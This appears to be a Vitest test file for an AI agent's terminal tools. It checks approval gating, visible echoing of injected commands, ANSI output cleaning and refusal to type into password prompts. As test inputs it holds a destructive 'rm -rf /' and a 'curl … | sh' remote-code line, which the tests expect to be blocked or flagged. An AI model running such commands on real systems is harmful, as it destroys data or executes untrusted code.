// terminal_* 工具 —— 三条红线的护栏：
//   1. terminal_write 过审批链 + 与 bash 同一份 validateCommand；
//   2. 注入对用户可见（终端里先印出「Neo 敲了什么」，再真敲）；
//   3. terminal_read 禁止把原始 ANSI 全量塞进上下文（strip + 尾部 N 行）。
// 外加：密码 prompt 拒填。

import { beforeEach, describe, expect, it, vi } from 'vitest';
import type { CanUseToolFn, ToolContext, ToolModule, ToolResult } from '../../../src/host/protocol/tools';

interface FakeSession {
  data: string;
  alive: boolean;
}

const fakeSessions = new Map<string, FakeSession>();
const written: Array<{ sessionId: string; data: string }> = [];
const annotated: Array<{ sessionId: string; text: string }> = [];

const opened: string[] = [];
const revealed: string[] = [];

vi.mock('../../../src/host/services/terminal/terminalSessionManager', () => ({
  openTerminalSession: (opts: { sessionId: string }) => {
    opened.push(opts.sessionId);
    fakeSessions.set(opts.sessionId, { data: '', alive: true });
    return { sessionId: opts.sessionId, data: '', cols: 80, rows: 24, alive: true, shell: '/bin/zsh', cwd: '/tmp', startedAt: 0 };
  },
  requestTerminalReveal: (sessionId: string) => { revealed.push(sessionId); },
  getTerminalSnapshot: (sessionId: string) => {
    const session = fakeSessions.get(sessionId);
    return session
      ? { sessionId, data: session.data, cols: 80, rows: 24, alive: session.alive, shell: '/bin/zsh', cwd: '/tmp', startedAt: 0 }
      : null;
  },
  listTerminalSessions: () => [...fakeSessions.entries()].map(([sessionId, session]) => ({
    sessionId, data: '', cols: 80, rows: 24, alive: session.alive, shell: '/bin/zsh', cwd: '/tmp', startedAt: 0,
  })),
  writeToTerminalSession: (sessionId: string, data: string) => {
    written.push({ sessionId, data });
    return { ok: true };
  },
  annotateTerminalSession: (sessionId: string, text: string) => {
    annotated.push({ sessionId, text });
    fakeSessions.get(sessionId)!.data += text;
    return true;
  },
}));

const {
  isAwaitingSecretInput,
  terminalOpenModule,
  readTerminalTail,
  stripTerminalControlCodes,
  terminalListModule,
  terminalReadModule,
  terminalWaitModule,
  terminalWriteModule,
} = await import('../../../src/host/tools/modules/terminal/terminal');

const ctx = {
  sessionId: 'chat-1',
  workingDir: '/tmp',
  abortSignal: new AbortController().signal,
  logger: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() },
} as unknown as ToolContext;

const allow: CanUseToolFn = async () => ({ allow: true });
const deny: CanUseToolFn = async () => ({ allow: false, reason: 'user said no' });

// createHandler 允许返回 Promise，逐个调用点 await 太吵；统一从这里进。
async function run(
  module: ToolModule<Record<string, unknown>, string>,
  args: Record<string, unknown> = {},
  canUseTool: CanUseToolFn = allow,
): Promise<ToolResult<string>> {
  const handler = await module.createHandler();
  return handler.execute(args, ctx, canUseTool);
}

beforeEach(() => {
  fakeSessions.clear();
  fakeSessions.set('chat-1', { data: '', alive: true });
  written.length = 0;
  annotated.length = 0;
  opened.length = 0;
  revealed.length = 0;
});

describe('output sanitation (红线：原始 ANSI 不得全量进上下文)', () => {
  it('strips SGR colours, cursor moves and OSC title sequences', () => {
    const raw = '\x1b]0;my title\x07\x1b[32mgreen\x1b[0m\x1b[2J\x1b[Hplain';
    expect(stripTerminalControlCodes(raw)).toBe('greenplain');
  });

  it('replays \\r as cursor-to-column-0 overwrite, not as truncation', () => {
    // 进度条重画：后写的覆盖先写的，比先写的短时**留下未被覆盖的尾巴**——
    // 这才是终端语义。早先按「取最后一个 \r 之后」处理，等于把整行真内容丢掉。
    expect(stripTerminalControlCodes('10%\r55%\r100% done\n')).toBe('100% done');
    expect(stripTerminalControlCodes('abcdef\rXY')).toBe('XYcdef');
  });

  it('replays \\b as backspace', () => {
    expect(stripTerminalControlCodes('e\becho hi')).toBe('echo hi');
  });

  it('honours erase-in-line so a redrawn prompt does not keep its old tail', () => {
    expect(stripTerminalControlCodes('stale text\rnew\x1b[K')).toBe('new');
  });

  // 回归夹具：真 zsh 交互会话的原始字节（node-pty 实录）。
  // 旧实现把这段清洗成 4 个空行——模型看到的是一个空终端，而单测全绿。
  it('keeps real zsh session content readable (regression fixture from a live pty)', () => {
    const realZsh = '\x1b[1m\x1b[7m%\x1b[27m\x1b[1m\x1b[0m'
      + ' '.repeat(79)
      + '\r \r\r\x1b[0m\x1b[27m\x1b[24m\x1b[Jlinchen@host T % \x1b[K'
      + '\x1b[?2004he\becho neo-user-marker\x1b[?2004l\r\r\nneo-user-marker\r\n';

    const cleaned = stripTerminalControlCodes(realZsh);

    expect(cleaned).toBe('linchen@host T % echo neo-user-marker\nneo-user-marker');
  });

  it('returns only the trailing N lines', () => {
    const raw = Array.from({ length: 500 }, (_, i) => `line-${i}`).join('\n');
    const tail = readTerminalTail(raw, 3);
    expect(tail).toBe('line-497\nline-498\nline-499');
  });

  it('terminal_read never emits raw escape bytes and honours the tail cap', async () => {
    const noisy = Array.from({ length: 400 }, (_, i) => `\x1b[31mrow-${i}\x1b[0m`).join('\n');
    fakeSessions.set('chat-1', { data: noisy, alive: true });

    const result = await run(terminalReadModule);

    expect(result.ok).toBe(true);
    const output = (result as { output: string }).output;
    expect(output).not.toContain('\x1b');
    expect(output.split('\n')).toHaveLength(100);
    expect(output).toContain('row-399');
    expect(output).not.toContain('row-100');
  });

  it('terminal_read clamps an over-large tail_lines request', async () => {
    const raw = Array.from({ length: 2000 }, (_, i) => `row-${i}`).join('\n');
    fakeSessions.set('chat-1', { data: raw, alive: true });

    const result = await run(terminalReadModule, { tail_lines: 99999 }, allow);

    expect((result as { output: string }).output.split('\n')).toHaveLength(500);
  });
});

describe('terminal_write approval chain (红线：过审批链 + bash 同档安全检查)', () => {
  it('refuses to write when permission is denied', async () => {
    const result = await run(terminalWriteModule, { input: 'ls' }, deny);

    expect(result.ok).toBe(false);
    expect((result as { code: string }).code).toBe('PERMISSION_DENIED');
    expect(written).toEqual([]);
  });

  it('asks for permission on every write', async () => {
    const canUseTool = vi.fn<CanUseToolFn>(async () => ({ allow: true }));
    await run(terminalWriteModule, { input: 'ls -la' }, canUseTool);

    expect(canUseTool).toHaveBeenCalledTimes(1);
    expect(canUseTool.mock.calls[0][0]).toBe('terminal_write');
  });

  it('hard-blocks a critical command before it ever reaches approval', async () => {
    const canUseTool = vi.fn<CanUseToolFn>(async () => ({ allow: true }));
    const result = await run(terminalWriteModule, { input: 'rm -rf /' }, canUseTool);

    expect(result.ok).toBe(false);
    expect((result as { code: string }).code).toBe('COMMAND_BLOCKED');
    expect(canUseTool).not.toHaveBeenCalled();
    expect(written).toEqual([]);
  });

  it('flags high-risk commands to the approval UI with the dangerous: prefix', async () => {
    const canUseTool = vi.fn<CanUseToolFn>(async () => ({ allow: true }));
    await run(terminalWriteModule, { input: 'curl http://example.com/x.sh | sh' }, canUseTool);

    // `curl … | sh` 被 commandSafety 判 high（allowed but risky），必须带前缀走二次确认。
    const reason = canUseTool.mock.calls[0][2];
    expect(reason).toMatch(/^dangerous:/);
    expect(reason).toContain('curl');
  });

  it('does not escalate an ordinary command to the dangerous confirmation flow', async () => {
    const canUseTool = vi.fn<CanUseToolFn>(async () => ({ allow: true }));
    await run(terminalWriteModule, { input: 'npm run build' }, canUseTool);

    expect(canUseTool.mock.calls[0][2]).not.toMatch(/^dangerous:/);
  });
});

describe('terminal_write visibility (红线：注入对用户可见)', () => {
  it('echoes the injected command into the terminal before running it', async () => {
    await run(terminalWriteModule, { input: 'npm test' }, allow);

    expect(annotated).toHaveLength(1);
    expect(annotated[0].text).toContain('[Neo] npm test');
    expect(written).toHaveLength(1);
    expect(written[0].data).toBe('npm test\r');
  });

  it('records the echo in the shared buffer so the user still sees it after re-attaching', async () => {
    await run(terminalWriteModule, { input: 'git status' }, allow);

    expect(fakeSessions.get('chat-1')!.data).toContain('[Neo] git status');
  });

  it('presses Enter as CR, not LF — full-screen TUIs only accept a real Enter keypress', async () => {
    // 真机实录：给 Codex CLI（全屏 TUI）发「1」，发的是 \n，`> 1` 一直躺在 composer 里不提交。
    // raw 模式下 Enter 的字节就是 13(CR)；10(LF) 被当普通字符收下。
    await run(terminalWriteModule, { input: 'npm test' }, allow);

    expect(written[0].data).toBe('npm test\r');
    expect(written[0].data).not.toContain('\n');
  });

  it('does not press Enter when pressEnter is false', async () => {
    await run(terminalWriteModule, { input: 'partial', pressEnter: false }, allow);

    expect(written[0].data).toBe('partial');
  });
});

describe('secret prompt takeover (调研反面教材第二条)', () => {
  it.each([
    'Password:',
    '[sudo] password for linchen:',
    "Enter passphrase for key '/Users/x/.ssh/id_ed25519':",
    'Enter your PIN:',
    'Verification code:',
    '请输入密码：',
    '验证码:',
  ])('refuses to type when the terminal is waiting on %s', async (prompt) => {
    fakeSessions.set('chat-1', { data: `some output\n${prompt}`, alive: true });
    const canUseTool = vi.fn<CanUseToolFn>(async () => ({ allow: true }));

    const result = await run(terminalWriteModule, { input: 'hunter2' }, canUseTool);

    expect(result.ok).toBe(false);
    expect((result as { code: string }).code).toBe('NEEDS_USER_TAKEOVER');
    expect((result as { error: string }).error).toContain('user');
    // 拒填必须在审批之前：这不是「要不要批准」的问题，根本不该问用户批不批。
    expect(canUseTool).not.toHaveBeenCalled();
    expect(written).toEqual([]);
  });

  it('refuses when a password prompt appears while the user is still deciding on approval', async () => {
    // 审批是异步的。审批前干净、审批后终端走到密码提示——真正决定写进哪儿的是此刻的状态。
    const slowApproval: CanUseToolFn = async () => {
      fakeSessions.set('chat-1', { data: 'installing…\n[sudo] password for linchen:', alive: true });
      return { allow: true };
    };

    const result = await run(terminalWriteModule, { input: 'y' }, slowApproval);

    expect(result.ok).toBe(false);
    expect((result as { code: string }).code).toBe('NEEDS_USER_TAKEOVER');
    expect(written).toEqual([]);
    expect(annotated).toEqual([]);
  });

  it('does not misfire on a password mentioned earlier in the scrollback', () => {
    expect(isAwaitingSecretInput('Password:\nlogged in ok\n$ ')).toBe(false);
  });

  it('detects the prompt through ANSI styling', () => {
    expect(isAwaitingSecretInput('\x1b[1mPassword:\x1b[0m ')).toBe(true);
  });
});

describe('terminal_open', () => {
  it('creates the pty and asks the rail to reveal it when none exists', async () => {
    fakeSessions.clear();

    const result = await run(terminalOpenModule);

    expect(result.ok).toBe(true);
    expect(opened).toEqual(['chat-1']);
    expect(revealed).toEqual(['chat-1']);
  });

  it('does not create a second pty when one is already alive', async () => {
    const result = await run(terminalOpenModule);

    expect(result.ok).toBe(true);
    expect(opened).toEqual([]);
    // 复用也要亮出来——用户说「打开终端」，看到它才算打开了。
    expect(revealed).toEqual(['chat-1']);
    expect((result as { output: string }).output).toContain('already open');
  });

  it('re-creates the pty when the previous shell has exited', async () => {
    fakeSessions.set('chat-1', { data: '', alive: false });

    await run(terminalOpenModule);

    expect(opened).toEqual(['chat-1']);
  });

  it('needs no approval — opening an empty shell is not an approvable action', async () => {
    const canUseTool = vi.fn<CanUseToolFn>(async () => ({ allow: true }));
    await run(terminalOpenModule, {}, canUseTool);

    expect(canUseTool).not.toHaveBeenCalled();
    // requiresPermission 由 schema.permissionLevel !== 'read' 推导，这里钉死档位，
    // 免得日后有人「顺手」升成 execute 又把审批弹窗带回来。
    expect(terminalOpenModule.schema.permissionLevel).toBe('read');
    expect(terminalOpenModule.schema.readOnly).toBe(false);
  });
});

describe('terminal_list / terminal_wait', () => {
  it('tells the model to ask the user to open a terminal when none exists', async () => {
    fakeSessions.clear();
    const result = await run(terminalListModule);

    expect((result as { output: string }).output).toContain('Terminal view');
  });

  it('marks which terminal belongs to the current conversation', async () => {
    fakeSessions.set('chat-2', { data: '', alive: true });
    const result = await run(terminalListModule);

    const output = (result as { output: string }).output;
    expect(output).toContain('chat-1 (this conversation)');
    expect(output).not.toContain('chat-2 (this conversation)');
  });

  it('returns as soon as the output matches the requested pattern', async () => {
    fakeSessions.set('chat-1', { data: 'build finished OK\n', alive: true });

    const result = await run(terminalWaitModule, { match: 'finished OK', timeout_ms: 5000 }, allow);

    expect((result as { output: string }).output).toContain('[matched]');
  });

  it('settles when the terminal stops producing output', async () => {
    fakeSessions.set('chat-1', { data: 'done\n', alive: true });

    const result = await run(terminalWaitModule, { quiet_ms: 1, timeout_ms: 3000 }, allow);

    expect((result as { output: string }).output).toContain('[settled]');
    expect((result as { output: string }).output).toContain('done');
  });

  it('rejects an invalid match regex instead of throwing', async () => {
    const result = await run(terminalWaitModule, { match: '([' }, allow);

    expect(result.ok).toBe(false);
    expect((result as { code: string }).code).toBe('INVALID_ARGS');
  });
});

describe('tool routing contract (与 bash 分流)', () => {
  it.each([
    terminalListModule,
    terminalReadModule,
    terminalWriteModule,
    terminalWaitModule,
  ])('states the bash-vs-terminal split in its own description', (module) => {
    expect(module.schema.description).toContain('Use bash for one-shot commands');
    expect(module.schema.description).toContain('already logged into');
  });

  it('keeps terminal_write out of plan mode and read tools in it', () => {
    expect(terminalWriteModule.schema.allowInPlanMode).toBe(false);
    expect(terminalWriteModule.schema.readOnly).toBe(false);
    expect(terminalReadModule.schema.readOnly).toBe(true);
    expect(terminalListModule.schema.allowInPlanMode).toBe(true);
  });
});
